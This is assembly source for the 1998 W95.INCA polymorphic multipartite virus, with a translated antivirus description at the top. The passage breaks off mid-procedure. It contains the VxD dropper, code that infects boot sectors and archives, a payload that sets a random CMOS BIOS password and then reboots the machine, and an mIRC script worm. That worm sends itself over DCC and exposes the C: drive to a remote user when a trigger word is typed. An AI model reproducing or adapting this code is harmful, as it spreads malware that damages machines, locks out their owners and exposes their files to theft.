;[W95.INCA] Multipartite PE/BOOT polymorphic mIRC spreading infector
;Copyright 1998 (c) Vecna
;
;This is my first attempt at w95 plataform. Is a multipartite infector of PE
;filez, focused in fast spreading. It infect PE files by adding a new section
;randomly named and a polymorphic VxD-dropper. It infect ARJ/ZIP/RAR/LHA/PAK
;by adding a random named COM dropper, encripted by a polymorphic loop. It
;infect boot of floppies by adding a polymorphic loader to their boot sectorz.
;It spread over internet using DCC protocol provided by mIRC, using a worm to
;spread over channelz. In the internet part is also the payload activation.
;
;The polymorphic decriptor in PE files isnt based in math instructionz, but
;in swapping. This novel technic of encription should provide problemz to
;disinfection and detection i hope, as not the whole code is "encripted" , but
;just some chunkz. The polymorphic decriptor is filled by lotz of conditionalz
;and unconditional jumpz.
;
;The polymorphic engine that generate the droppers and the boot loader keep
;track of the contentz of all regz and flagz, as in advanced engines as
;Uruguay or Level3. This mean that if i need AX holding 0x0202, as for load 2
;sectorz in the boot loader, i can obtain this values using XOR AX, ??? or
;ADD AX, ??? and like.
;
;This source isnt compilable as is. Use the pre-compiled virus.
;
;
;Here's the description of w95/Inca by DrWeb, translated from russian to
;english by Lurker (thankz!!)
;
;
;Win95. Inca
;
;       Dangerous resident polymorphic multipartite virus. Win95.Inca
;       infects EXE files in a format of PE (Portable Executable) for
;       operation systems Windows95/98 and boot sectors of floppy
;       disks. And also Win95.Inca is a virus-worm for ARJ, LHA, LZH,
;       PAK, RAR and ZIP-archives and for the mIRC32 program.
;
;       When infected PE file is started, the virus receives management
;       and polymorphic decryptor deciphers the base code of a virus.
;       And this decoding is made by enough unusual way - in initial variant
;       the base virus code will contatin the table of indexes or displacements
;       of original bytes in the virus body. And it is necessary to understand
;       that decoding in this case will be substitution or compilation
;       original bytes on place of their one-byte indexes or displacements.
;       After given "assembly" of the code, virus determines (by
;       "already standard" for this type of viruses algorithm) the address
;       of interesting for it functions in KERNEL32.DLL and creates
;       a file C:\W95INCA.COM, in which file virus writes a polymorphic
;       DOS COM dropper.
;
;       This polymorphic 16bit DOS-code is already generated on infection of
;       the PE EXE-file, and because of that any "additional efforts" for
;       creation of a polymorphic copies on the given stage are not undertaken.
;       Then the created file is closed.
;       This dropper file is executed by the virus and then, after some delay,
;       deleted. Further the virus returnes back management to the
;       infected host PE-file.
;       This is all actions, which carries out a virus code in the PE EXE-file.
;       Therefore, it is possible to consider all infected PE EXE-files, as
;       droppers.
;
;       The C:\W95INCA.COM file, executed by the virus, determines Windows
;       directory (WINDIR) and tries to create in the \WINDOWS\SYSTEM folder
;       a file with the name FONO98.VXD.
;       If this attempt is successful, the virus unpacks
;       with the elementary algorithm, a code of the 32bit VxD-driver,
;       which is contained inside of the 16bit DOS-code, and writes it in
;       this newly created FONO98.VXD file.
;
;       Further virus opens a configuration Windows file SYSTEM.INI, searches
;       in it for the section "[386Enh]" and just below this line
;       writes a line "device=fono98.vxd".
;
;       After described manipulations, or, if the line "device=fono98.vxd"
;       is already is present in the SYSTEM.INI, or file FONO98.VXD
;       was created earlier in the \WINDOWS\SYSTEM folder, or,
;       if it wasn't possible to find the WINDOWS folder, virus finishes its
;       work and returns management to DOS.
;
;       After the system reboot and on the next startof Windows virus
;       VxD-driver FONO98.VXD is loaded by the system into a memory and
;       runned.
;
;       In a first task, the virus driver deletes system VxD-driver HSFLOP.PDR
;       in the catalogue \WINDOWS\SYSTEM\IOSUBSYS folder. Then virus reads
;       in memory a code from its own FONO98.VXD and creates in memory
;       three different polymorphic copies: for infection PE EXE-files,
;       for infection of boot-sectors of floppies and for creation of
;        16bit DOS droppers in a format of COM-files.
;       Futher, in a current session, and untill the next system reboot,
;       virus will infect the specified objects only with these copies.
;
;       Win95.Inca concerns to a class of the "slow polymorpics".
;       Further virus "intercepts" IFSMgr FileSystemApiHook and Int 13h
;       (disk operations), establishing on them its own events handlers.
;
;       IFSMgr handler of the virus supervises opening files. On the
;       opening files with extensions EXE and SCR, virus checks their
;       internal format, and if the opening files are Portable Executable,
;       virus infects them, by creating additional code section with a
;       random name in the header of PE-file and writing in its area virus
;       polymorphic code. On opening of archive files with the extensions
;       LHA, LZH, PAK, ZIP, ARJ or RAR, the virus adds to the given
;       archives its 16bit polymorphic code (worm) in a format of COM-file,
;       also modifies header of the archive files in such a manner that
;       the this virus-worm appears placed in the archive in a unpacked
;       form (store format) also receives a random name, consisting from
;       four letters, and with the extension COM or EXE (for example, AAAA.COM
;       or ABCD.EXE). On opening of the MIRC32.EXE file (program for
;       "chat" over the Internet) the virus writes or adds in the end
;       of the configuration file MIRC.INI, line " [fileserver]" and
;       "Warning = Off".
;
;       Also virus creates a new (if they exist on a disk) files SCRIPT.OLD,
;       SCRIPT.INI, INCA.EXE and REVENGE.COM.
;       In the file INCA.EXE, virus writes a code of the polymorphic 16bit
;       virus-worm. In the file REVENGE.COM - 231 bytes of the trojan code,
;       that rewrites the content of the CMOS-memory.
;       [*Authors Note - It put a password in AMI/AWARD BIOS*]
;
;       And in the file SCRIPT.INI virus writes text of the virus MIRC-worm.
;
;       On start of the MIRC32.INI under scenario of the SCRIPT.INI,
;       it runs the file INCA.EXE. Further under the same scenario it
;       tries to send files SCRIPT.INI (mIRC-worm) and INCA.EXE (virus
;       dropper) to computers of all members of the "chat conversation" in
;       the Internet.
;       If during the chat there will appaer a text string "El_inca",
;       under the scenario of the SCRIPT.INI - trojan program REVENGE.COM
;       will be launched. If somebody will "tell a word" "ancev",
;       the virus script "will allow" him to access disk  drive C:.
;       Even if this person is for several thousand miles from the infected
;       computer.
;
;       And if at the time of "conversation" there will appear a text
;        "_29A_", the program MIRC32.EXE will self-exits.
;
;       Virus handler of the disk operations on the Int 13h, supervises
;       the reading of the boot sectors of the floppes in the drive A:
;       and on an opportunity infects them, by replacing the original
;       boot loader with polymorphic, and writing on a disk its own
;       copies.
;
;       On a booting from such infected floppy, virus loader will
;       receive management, and will read to memory all sectors with the
;       virus code, "will intercept" Int 1Ch (timer), and then Int 21h.
;       A task of the  Int21h handler is simple - on the first
;       opportunity, it tries to create FONO98.VXD in the
;       C:\WINDOWS\SYSTEM folder and to register
;       it in the SYSTEM.INI configuration file (in the "[386Enh]" section).
;       The task is exactly the same, as well as performed by a
;       C:\W95INCA.COM file-dropper, algorithm of which was
;       described in the beginning.
;       A difference only that the dropper C:\W95INCA.COM determines
;       the lochation of Windows system folder fome a variable WINDIR.
;       And Int21h handler tries to place dropper in the C:\WINDOWS\SYSTEM
;       folder.
;       After the given attempt (successful or not) the virus
;       "releases" Int21h and neutralizes its own copy in memory.
;
;       The virus contains text "El Inca virus".
;
;       The size of the virus VxD-driver is 15327 bytes.
;
;       So, all infected objects can be considered as virus-hosts or droppers,
;       except created by the virus VxD-driver.
;       This VxD-driver installs virus copy in memory, and hits all other
;       objects. However you see that it does not infect
;       "similar to itself" VxD-drivers. VxD-driver is only the carrier
;       of an infection, but it is not an infected object.
;


         MINSIZEINFECT  EQU 8*1024             ;zopy me - i want to trawel


  BPB STRUC
         bpb_jmp db 3 dup (?)
         bpb_oem db 8 dup (?)
         bpb_b_s dw ?
         bpb_s_c db ?
         bpb_r_s dw ?
         bpb_n_f db ?
         bpb_r_e dw ?
         bpb_t_s dw ?
         bpb_m_d db ?
         bpb_s_f dw ?
         bpb_s_t dw ?
         bpb_n_h dw ?
         bpb_h_d dw ?
         bpb_sht db 20h dup (?)
  BPB ENDS

.386p
.XLIST
   Include Vmm.Inc
   Include Ifs.Inc
   Include Ifsmgr.Inc
.LIST

Declare_Virtual_Device FONO98, 1, 0, FONO98_Control, Undefined_Device_ID,,,

VxD_Locked_Code_Seg

       IncaName   db 'INCA.EXE', 0             ;Vars used by the virus
       NextHook   dd 0
       FileHandle dd 0
       FileSize   dd 0
       FileAttr   dd 0
       Pad        dd 0
       BufferOneHandle   dd 0
       BufferTwoHandle   dd 0
       VxDCompressedBuffer dd 0
       VxDCompressedSize   dd 0
       PolyBootSize        dd 0
       PolyBootBuffer      dd 0
       PolyDOSFileBuffer   dd 0
       PolyDOSFileSize     dd 0
       PolyPESize          dd 0
       PolyPEBuffer        dd 0
       VMF_handle dd 0
       VMF_size   dd 0
       VMF_base   dd 0
       OurFile     db 0
       FloppyInUse db 0
       UpDown     db 0
       Compressed db 0
       CrpTbl         db 200h dup (0)
     SectorBuffer     Equ This Byte
       CrcTab         db 2048 dup (0)
     FileName         Equ This Byte
       VMM32Path      db MAX_PATH dup (0)



       ZIPRHeaderId        db 'PK'             ;Structures used when
       ZIPRSignature       db 01, 02           ;infecting archivers
       ZIPRVerMade         dw 10
       ZIPRVerNeed         dw 0ah
       ZIPRFlags           dw 0
       ZIPRMethod          dw 0
       ZIPRTimeDate        dd 12345678h
       ZIPRCRC32           dd 0
       ZIPRCompressed      dd 0
       ZIPRUncompressed    dd 0
       ZIPRSizeFilename    dw ZIPRNameLenght
       ZIPRExtraField      dw 0
       ZIPRCommentSize     dw 0
       ZIPRDiskNumba       dw 0
       ZIPRInternalAttr    dw 01
       ZIPRExternalAttr    dd 21h
       ZIPROffsetLHeaderR  dd 0
       ZIPRFilename        db 'AAAA.COM'
     ZIPRNameLenght      Equ This Byte - offset32 ZIPRFilename
     ZIPRHeaderSize      Equ This Byte - offset32 ZIPRHeaderId

       ZIPLHeaderId        db 'PK'
       ZIPLSignature       dw 0403h
       ZIPLVersionNeed     dw 0010
       ZIPLFlags           dw 80h
       ZIPLMethod          dw 0
       ZIPLDateTime        dd 12345678h
       ZIPLCRC32           dd 0
       ZIPLCompressed      dd 0
       ZIPLUncompressed    dd 0
       ZIPLSizeFilename    dw ZIPLNameLenght
       ZIPLExtraField      dw 0
       ZIPLFilename        db 'AAAA.COM'
     ZIPLNameLenght      Equ This Byte - offset32 ZIPLFilename

     ZIPReadBuffer       Equ This Byte
       ZIPEHeaderId        db 'PK'
       ZIPSignature        dw 0
       ZIPNoDisk           dw 0
       ZIPNoStartDisk      dw 0
       ZIPEntryDisk        dw 0
       ZIPEntrysDir        dw 0
       ZIPSizeDir          dd 0
       ZIPOffsetDir        dd 0
       ZIPCommentLenght    dw 0
     ZIPEHeaderSize      Equ This Byte - offset32 ZIPEHeaderId

       ARJHeaderId         dw 0ea60h
       ARJHeaderSize       dw offset32 ARJHeaderCRC-offset32 ARJ1HeaderSize
       ARJ1HEaderSize      db offset32 ARJFilename-offset32 ARJ1HeaderSize
       ARJVersionDone      db 6
       ARJVersionNeed      db 1
       ARJHostOS           db 0
       ARJFlags            db 0
       ARJMethod           db 0
       ARJType             db 0
       ARJReserved         db 0
       ARJDateTime         dd 12345678h
       ARJCompressedSize   dd 0
       ARJUncompressedSize dd 0
       ARJFileCRC          dd 0
       ARJEntryname        dw 0
       ARJAccessMode       dw 21h
       ARJHostData         dw 0
       ARJFilename         db 'AAAA.COM',0
       ARJComment          db 0
       ARJHeaderCRC        dd 0
       ARJExtHeader        dw 0
       ARJEnd              dw 0ea60h, 0000h

       RARHeaderCRC        dw 0
       RARHeaderType       db 74h
       RARFileFlags        dw 08000h
       RARHeaderSize       dw offset32 RARHeaderEnd - offset32 RARHeaderCRC
       RARCompressedSize   dd 0
       RARUncompressedSize dd 0
       RARHostOS           db 0
       RARFileCRC          dd 0
       RARDateTime         dd 12345678h
       RARVersionNeed      db 14h
       RARMethod           db 30h
       RARFileNameSize     dw offset32 RARHeaderEnd - offset32 RARFileName
       RARFileAttribute    dd 21h
       RARFileName         db 'AAAA.COM'
     RARHeaderEnd        Equ This Byte

       LHASig              db LHAHeaderSize-2
       LHAHeaderCRC        db 0
       LHAMethod           db '-lh0-'
       LHACompressedSize   dd 0
       LHAUncompressedSize dd 0
       LHADateTime         dd 12345678h
       LHAFlags            dw 120h
       LHANameLenght       db offset32 LHASizeFilename - offset32 LHAFilename
       LHAFilename         db 'AAAA.COM'
     LHASizeFilename     Equ This Byte
       LHACRC16            dw 0
       LHAStuff            db 'M'
       LHAStuff2           dw 0
     LHAHeaderSize       Equ This Byte - offset32 LHASig



       MyVxDName db "FONO98.VXD",0
     SizeVxDName Equ This Byte - offset32 MyVxDName

       FloppyVxD       db "IOSUBSYS\HSFLOP.PDR", 0
     SizeFloppyVxDName Equ This Byte - offset32 FloppyVxD



       BootLoaderSize Equ BootLoaderEnd-BootLoader
     BootLoader:                               ;This code is inserted in
           cli                                 ;0/1/15 in 1.44 floppies
           xor ax, ax
           mov ss, ax
           mov sp, 7c00h                       ;It is loaded by the
           sti                                 ;polymorphic loader inserted
           cld                                 ;in the boot code
           mov ds, ax
           dec word ptr ds:[413h]
           int 12h                             ;reserve 1kb and copy ourself
           ror ax, 10                          ;to the reserved hole
           mov es, ax
           call delta
     delta:
           pop si
           push ds
           sub si, offset delta                ;full of bugs and hardcoded
           xor di, di                          ;references, as you can see :(
           push cs
           mov cx, 200h
           pop ds
           rep movsw                           ;copy 1kb of code
           pop ds
           push es
           push offset hstart
           retf                                ;continue in TOM
    hstart:
           xor ax, ax
           mov es, ax
           mov ax, 0201h
           mov cx, 0001h
           mov dx, 0180h
           mov bx, 7c00h
           int 13h                             ;read HDD boot sector
           cmp word ptr [bx+3h], 'SM'
           jne fuck
           cmp word ptr [bx+1f1h], 'IW'
           jne fuck
           xor eax, eax
           mov ds, ax
           mov dword ptr ds:[21h*4], eax       ;initialize int21
           mov ax, offset int1c
           mov si, 1ch*4
           mov di, offset old1c
           cli
           xchg ax, word ptr ds:[si]
           push cs
           pop es
           stosw
           mov ax, cs
           xchg ax, word ptr ds:[si+2]         ;hook int1c
           stosw
           sti
     fuck:
           cld
           xor ax, ax
           mov di, offset loader
           mov cx, offset fuck-offset loader
           rep stosb                           ;wipe some parts of loader
           db 0eah                             ;from memory to reduce
           dw 7c00h                            ;footprints
           dw 0
     Zopy0:
           push cs
           cld
           mov di, offset int1c
           mov cx, offset int1c-offset e_vxd
           sub ax, ax
           pop es
           rep stosb                           ;wipe all virus loader code
     no_4b00:                                  ;(less some bytes)
           popad
           pop es
           pop ds
           int 0ffh
           retf 2
     int1c:
           push ds
           pushad
           push 0
           pop ds
           mov cx, word ptr ds:[21h*4+2]
           db 081h, 0f9h                       ;cmp cx, 0
           dw 0
     i1c_check equ word ptr $ -2
           je not_yet                          ;did int21 seg changed?
           mov word ptr cs:[i1c_check], cx
           mov cx, 0
     time_2 equ word ptr $ -2
           inc word ptr cs:[time_2]            ;increase number of changes
           cmp cl, 3
           jnz not_yet                         ;changed 3 times?
           mov esi, 21h*4
           mov edi, 0ffh*4
           mov eax, dword ptr ds:[esi]
           mov dword ptr ds:[edi], eax         ;copy int21 to int0ff
           mov ax, cs
           rol eax, 16
           mov ax, offset int21
           mov dword ptr ds:[esi], eax         ;hook int21 to our code
           mov eax, dword ptr cs:[old1c]
           mov dword ptr ds:[1ch*4], eax       ;restore int1c
     not_yet:
           popad
           pop ds
           db 0eah
     old1c dd 0
     read_vxd:
           mov ax, 8000h                       ;if the floppy was retired,
           mov ds, ax                          ;shit happen... :(
           mov es, ax
           sub bx, bx
           mov dx, 0000h
           call read_last_track                ;read 79/0/1 and 79/1/1 to
           jc error                            ;mem
           mov dx, 0100h
           add bx, (18*512)
     read_last_track:                          ;init FDD controller
           sub ax, ax
           int 13h
           mov ax, 0212h
           mov cx, 4f01h
           int 13h                             ;read track(head is selected
     error:                                    ;above)
           ret
     int21:
           push ds
           push es
           pushad
           push 0
           pop ds
           cmp ax, 4b00h                       ;is first exec?
           jne no_4b00
           mov eax, dword ptr ds:[0ffh*4]
           mov dword ptr ds:[21h*4], eax       ;restore int21
           cld
           call infect_system                  ;drop our vxd
           jmp Zopy0                           ;and wipe loader out of mem
     infect_system:
           call read_vxd
           jc error
           sub si, si                          ;RLE compressed vxd is in mem
           mov di, ((18*512)*2)
           mov cx, word ptr cs:[c_vxd]
           call uncompress16                   ;uncompress VXD
           push cs
           pop ds
           call vxd
           db 'C:\WINDOWS\SYSTEM\FONO98.VXD', 0
     vxd:                                      ;when i said hardcoded
           pop dx                              ;reference, is this i mean :((
           mov ah, 5bh
           mov cx, 11b
           int 0ffh                            ;only create if not exists
           jc error
           xchg ax, bx
           push es
           pop ds
           mov cx, word ptr cs:[e_vxd]
           mov ah, 40h
           mov dx, ((18*512)*2)
           int 0ffh                            ;write uncompressed vxd
           jc close
           mov ah, 3eh
           int 0ffh
           push cs
           call system
           db 'C:\WINDOWS\SYSTEM.INI', 0       ;another hardcoded reference :(
     system:
           pop dx
           pop ds
           mov ax, 3d02h
           int 0ffh                            ;modify system.ini
           jc error
           mov ax, 8000h
           mov ds, ax
           sub dx, dx
           mov ah, 3fh
           mov cx, -1
           int 0ffh
           jc close                            ;read whole system.ini
           push cs
           pop es
           mov si, dx
           mov di, offset enh386
           mov cx, 10
     search:
           push di
           push si
           push cx
           rep cmpsb                           ;search for [Enh386] section
           je found
           pop cx
           pop si
           pop di
           inc si
           dec ax
           jnz search
           jmp close
     found:
           add sp, 6
           mov di, ax
           pusha
           mov di, offset device
           mov cx, 19
           rep cmpsb                           ;we are already registered?
           popa
           je close
           mov dx, si
           mov ax, 4200h
           int 0ffh
           jc close
           mov ah, 40h
           mov cx, 19
           mov dx, offset device
           int 0ffh                            ;write our device line
           jc close
           mov ah, 40h
           mov cx, di
           mov dx, si
           int 0ffh                            ;and rest of file
     close:
           mov ah, 3eh
           int 0ffh
           ret
     uncompress16:
           mov dx, di                          ;RLE decompression
           push dx
           mov bx, si
           add bx, cx
     next:
           lodsb
           or al, al
           jne store
           lodsw
           mov cx, ax
           xor ax, ax
           rep stosb
           dec di
     store:
           stosb
           cmp di, 0ff00h
           ja abortnow                         ;a safeguard to avoid mem
           cmp si, bx                          ;overwriting
           jbe next
     abortnow:
           pop bx
           mov cx, di
           sub cx, bx
           ret
     enh386 db '[386Enh]', 13, 10
     device db 'device=fono98.vxd', 13, 10
     VxDCompressSize dw 0
     VxDOriginalSize dw 0
     BootLoaderEnd Equ This Byte

       LoaderSize Equ LoaderEnd-Loader
     InfectWindows95 PROC                      ;This code is the main dropper
           call Delta                          ;for the viral VXD
     Delta:
           pop bp
           sub bp, offset Delta
           mov es, es:[2ch]                    ;get environment
           mov di, -1
     SearchWINDIR:
           inc di
           cmp di, 1024
           jae ReturnBack
           cmp byte ptr es:[di], 'w'           ;found a 'w'?
           jne SearchWINDIR
           push si
           push di
           lea si, [bp+offset WinDir]
           mov cx, 7
           rep cmpsb                           ;check if is windir=
           pop di
           pop si
           jne SearchWINDIR                    ;if not, keep searching
           add di, 7
           mov word ptr [bp+WinDX], di
           mov word ptr [bp+WinDS], es         ;save windows directory
           push es
           pop ds
           mov si, di
           push cs
           pop es
           lea di, [bp+offset Buffer]
     NextLetter:
           lodsb
           or al, al
           je CopyString
           stosb
           jmp NextLetter                      ;copy win95 dir to buffer
     CopyString:
           push cs
           pop ds
           lea si, [bp+offset SysDir]
     NextLetterAgain:
           lodsb
           stosb
           or al, al
           jnz NextLetterAgain                 ;append path and vxd name
           push cs
           push cs
           pop es
           pop ds
           mov ah, 5bh
           mov cx, 011b
           lea dx, [bp+offset Buffer]
           int 21h                             ;create vxd if it not exists
           jc ReturnBack
           push ax
           lea si, [bp+offset EndLoader]
           mov di, si
           add di, 30000
           mov cx, word ptr [bp+VxDSize1]
           call Uncompress16                   ;uncompress vxd
           pop bx
           mov ah, 40h
           mov cx, word ptr [bp+VxDSize2]
           int 21h                             ;write vxd
           jc Close
           mov ah, 3eh
           int 21h
     InfectSYSTEMINI:
           mov si, word ptr [bp+WinDX]
           mov ds, word ptr [bp+WinDS]
           lea di, [bp+offset Buffer]
     NextLtr:
           lodsb
           or al, al
           je CopyStr
           stosb
           jmp NextLtr                         ;copy windows dir to buffer
     CopyStr:                                  ;again
           push cs
           pop ds
           lea si, [bp+offset SysIni]          ;append system.ini
     NxtLetter:
           lodsb
           stosb
           or al, al
           jnz NxtLetter
           mov ax,3d02h
           lea dx, [bp+offset Buffer]
           int 21h
           jc ReturnBack                       ;open system.ini
           xchg ax, bx
           mov ah, 3fh
           mov cx, -1
           lea dx, [bp+offset VxDHere]
           int 21h
           jc Close
           mov si, dx
           lea di, [bp+offset Enh386]
           mov cx, 10
     Search:
           push di
           push si
           push cx
           rep cmpsb                           ;search for right section
           je Found
           pop cx
           pop si
           pop di
           inc si
           dec ax
           jnz Search
           jmp Close
     Found:
           add sp, 6
           mov di, ax
           pusha
           lea di, [bp+offset Device]
           mov cx, 19
           rep cmpsb                           ;already infected?
           popa
           je Close
           mov dx, si
           sub dx, offset VxDHere
           sub dx, bp
           mov ax, 4200h
           int 21h
           jc Close
           mov ah, 40h
           mov cx, 19
           lea dx, [bp+offset Device]
           int 21h                             ;write our device line
           jc Close
           mov ah, 40h
           mov cx, di
           sub cx, 10h
           mov dx, si
           int 21h
     Close:
           mov ah, 3eh
           int 21h
     ReturnBack:
           mov ax, 4c00h
           int 21h                             ;exit to DOS
     Uncompress16:
             mov dx, di
             push dx                           ;uncompress RLE
             mov bx, si                        ;(hmm... a bit redundant...)
             add bx, cx
     Next:
             lodsb
             or al, al
             jne Store
             lodsw
             mov cx, ax
             xor ax, ax
             rep stosb
             dec di
     Store:
             stosb
             cmp di, 0ff00h
             ja AbortNow
             cmp si, bx
             jbe Next
     AbortNow:
             pop bx
             mov cx, di
             sub cx, bx
             ret
     Enh386     db '[386Enh]', 13, 10
     Device     db 'device=fono98.vxd', 13, 10
     WinDir     db 'windir='
     SysIni     db '\SYSTEM.INI', 0
     SysDir     db '\SYSTEM\'
     VxDName    db 'FONO98.VXD',0
     WinDS      dw 0
     WinDX      dw 0
     UpDown     db 0
     Compressed db 0
     Buffer     db 64 dup(0)
     VxDSize2   dw 0
     VxDSize1   dw 0
     EndLoader  Equ This Byte
     VxDHere    Equ This Byte
     LoaderEnd Equ This Byte


BeginProc Compress32
         mov edx, esi                          ;compressor of modificated RLE
         add edx, ecx                          ;coded in 32bit
         xor eax, eax
         xor ecx, ecx
         push edi
  @1:
         lodsb
         or al, al
         jnz @2
         inc ecx
         jmp @1
  @2:
         or ecx, ecx
         jz @4
  @5:
         push eax
         xor eax, eax
         stosb
         xchg eax, ecx
         stosw
         pop eax
  @4:
         stosb
  @6:
         cmp esi, edx
         jbe @1
  @3:
         pop edx
         mov ecx, edi
         sub ecx, edx
         ret
EndProc Compress32

       Killer db 'REVENGE.COM', 0

       KCode Equ This Byte
     Payload:
           push 0f000h                         ;our copyrighted payload :)
           pop es
           xor di, di
           mov cx, -1
     scan:
           pusha
           mov si, offset award
           mov cx, 5
           repe cmpsb                          ;search ROM for AWARD signature
           popa
           jz award_psw
           inc di
           loop scan
           mov ax, 002fh                       ;if not found, assume AMI BIOS
           call read
           mov bx, ax
           mov al, 2dh
           call step1
           or al, 00010000b                    ;Put a random password in CMOS
           call step2                          ;memory, for ask it always,
           mov al, 2fh                         ;and correct checksum
           mov dh, bl
           call write
           mov al, 3eh
           call read
           mov ah, al
           mov al, 3fh
           call read
           mov bx, ax
           mov ax, 0038h
           call rndpsw
           mov al, 39h
           call rndpsw
           mov dh, bh
           mov al, 3eh
           call write
           mov dh, bl
           mov al, 3fh
           call write
           jmp hehehe
     award_psw:
           mov ax, 002fh
           call read
           mov bx, ax                          ;Put the password in CMOS
           mov al, 11h                         ;for AWARD BIOS machines
           call step1
           or al, 00000001b
           call step2
           mov al, 1bh
           call step1
           or al, 00100000b
           call step2
           mov al, 2fh
           mov dh, bl
           call write
           mov al, 7dh
           call read
           mov ah, al
           mov al, 7eh
           call read
           mov bx, ax
           mov ax, 0050h
           call rndpsw                         ;for ask always, and correcting
           mov al, 51h                         ;the checksum, of course :)
           call rndpsw
           mov dh, bh
           mov al, 7dh
           call write
           mov dh, bl
           mov al, 7eh
           call write
     hehehe:
           sti                                 ;reboot machine, so the user
           mov al, 0feh                        ;notice the payload soon ;)
           out 64h, al
           jmp hehehe
     read:
           and al, 7fh                         ;CMOS read
           out 70h, al
           jmp $+2
           jmp $+2
           in al, 71h
           ret
     write:
           and al, 7fh                         ;CMOS write
           out 70h, al
           jmp $+2
           mov al, dh
           out 71h, al
           ret
     rndpsw:                                   ;make random password but
           mov dh, al                          ;mantain correct checksum
           call read
           sub bx, ax
           in al, 40h
           add bx, ax
           xchg al, dh
           call write
           ret
     step1:
           mov dh, al                          ;checksum
           call read
           sub bx, ax
           ret
     step2:                                    ;checksum
           add bx, ax
           xchg al, dh
           call write
           ret
     award db 'AWARD'
       KCodeSize Equ $ - KCode


       ScriptSize Equ ScriptIniEnd - ScriptIni
     ScriptIni:
       [script]
       n0=run $mircdirinca.exe                 ;run virus dropper when mIRC
                                               ;start
       n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
       n2= /dcc send $nick $mircdirscript.ini
       n3= /dcc send $nick $mircdirinca.exe
       n4=}
       n5=ON 1:PART:#:{ /if ( $nick == $me ) { halt }
       n6= /dcc send $nick $mircdirscript.ini
       n7= /dcc send $nick $mircdirinca.exe
       n8=}                                    ;on /JOIN and /LEAVE, we send
                                               ;the script and the virus
                                               ;dropper to the target
       n9=ON 1:TEXT:*el_inca*:#:/run $mircdirrevenge.com
                                               ;when this is said, the souls
                                               ;of thousands of dead Inca
                                               ;indians come to take revenge
       n10=ON 1:TEXT:*ancev*:#:/fserve $nick 666 c:\
                                               ;just for the case that the
                                               ;host have something i want ;)
       n11=ON 1:TEXT:*_29A_*:#:/quit
                                               ;everybody bow in awe before
                                               ;our power!!
     ScriptIniEnd Equ This Byte

       ScriptName db 'SCRIPT.INI', 0

       ScriptName2 db 'SCRIPT.OLD', 0

       MircIni db 'MIRC.INI', 0

       InsertSize Equ IMircIniEnd - IMircIni
     IMircIni:
       db 13, 10                               ;this is inserted in MIRC.INI
       db '[fileserver]', 13, 10               ;to avoid warnings when we
       db 'Warning=Off', 13, 10                ;start the /FSERVER
     IMircIniEnd Equ This Byte



BeginProc FONO98_Device_Init
         VMMCall Close_Boot_Log
         xor al, al
         mov [OurFile], al
         mov [UpDown], al
         mov [Compressed], al
         mov [FloppyInUse], al                 ;init flags
         in ax, 40h
         ror eax, 16
         in ax, 40h
         mov dword ptr [seed], eax             ;init rnd seed
         mov esi, offset32 ScriptIni
         mov edi, esi
         mov ecx, ScriptSize
  DecriptScript:
         lodsb
         not al                                ;decript viral script.ini
         stosb
         loop DecriptScript
  GetPathToVMM:
         cld
         VMMCall Get_Exec_Path
         jc ErrorDone
         mov edi, edx
         mov ecx, 0ffh
         xor al, al
         repne scasb                           ;find end of string
         sub edi, edx
         mov ecx, edi
         mov edi, edx
         mov esi, offset32 VMM32Path
         pushad
         xchg esi, edi
         push ecx
         rep movsb                             ;copy it to our buffer
         std                                   ;(next time i will use
         pop ecx                               ;GetSystemPath, i swear ;)
         mov al, "\"
         repne scasb
         cld
         inc edi
         inc edi
  DeleteFloppyVxD:
         pushad
         mov esi, offset32 FloppyVxD
         mov ecx, SizeFloppyVxDName
         rep movsb                             ;HSFLOP.PDR
         mov eax, R0_FILEATTRIBUTES+SET_ATTRIBUTES
         xor ecx, ecx
         mov esi, offset32 VMM32Path
         VxDCall IFSMgr_Ring0_FileIO           ;kill attribs and delete the
         mov eax, R0_DELETEFILE                ;32bit driver for floppies
         VxDCall IFSMgr_Ring0_FileIO
         popad
  CopyMyVxDName:
         mov esi, offset32 MyVxDName
         mov ecx, SizeVxDName
         rep movsb                             ;append viral vxd and path
         popad
  ReadVxDAndCompress:
         mov eax, R0_OPENCREATFILE
         mov ebx, 0ff00h
         xor ecx, ecx
         mov edx, 1
         VxDCall IFSMgr_Ring0_FileIO
         jc ErrorDone                          ;autopen vxd
         mov ebx, eax
         mov eax, R0_GETFILESIZE
         VxDCall IFSMgr_Ring0_FileIO
         jc ErrorDone
         mov [VxDOriginalSize], ax
         mov [VxDSize2], ax
         mov ecx, eax
         call AllocMemory                      ;alloc some memory and read
         jz ErrorDone                          ;our vxd to this buffer
         mov [BufferOneHandle], eax
         mov esi, eax
         mov eax, R0_READFILE
         xor edx, edx
         VxDCall IFSMgr_Ring0_FileIO
         jnc NoError
  ErrorFreeBlock:
         mov eax, [BufferOneHandle]
         call DeAllocMemory
         jmp ErrorDone
  NoError:
         mov eax, R0_CLOSEFILE
         VxDCall IFSMgr_Ring0_FileIO
         mov ecx, (512*18)*2
         call AllocMemory
         jz ErrorDone
         mov [BufferTwoHandle], eax
         mov esi, [BufferOneHandle]
         mov edi, eax
         mov [VxDCompressedBuffer], edi
         call Compress32                       ;compress VXD using a simple
         mov [VxDCompressSize], cx             ;RLE scheme
         mov [VxDCompressedSize], ecx
         mov [VxDSize1], cx
         mov esi, [BufferOneHandle]
         push esi
         mov byte ptr [maq], 0
         call gldr                             ;make poly boot (16bit)
         pop ecx
         xchg ecx, edi
         sub ecx, edi
         mov [PolyBootSize], ecx
         mov edx, [BufferOneHandle]
         push HEAPNOCOPY
         push ecx
         push edx
         VMMCall _HeapReAllocate               ;set buffer to right size
         add esp, 12
         mov [PolyBootBuffer], eax
         mov ecx, 20000
         call AllocMemory
         jz ErrorDone
         mov esi, eax
         push eax
         mov byte ptr [maq], -1
         call gldr                             ;generate file poly (16bit)
         mov ah, byte ptr [key]
         mov esi, offset32 Loader
         mov ecx, LoaderSize
  DosEncriptLoop:
         lodsb
         xor al, ah
         stosb
         loop DosEncriptLoop                   ;encript loader
         mov esi, [VxDCompressedBuffer]
         mov ecx, [VxDCompressedSize]
  DosEncriptLoop2:
         lodsb
         xor al, ah
         stosb
         loop DosEncriptLoop2                  ;zopy and encript vxd
         pop ecx
         mov edx, ecx
         xchg ecx, edi
         sub ecx, edi
         mov [PolyDOSFileSize], ecx
         mov [PEDOSSize], ecx
         push HEAPNOCOPY
         push ecx
         push edx
         VMMCall _HeapReAllocate
         add esp, 12
         mov [PolyDOSFileBuffer], eax
         mov ecx, 40000
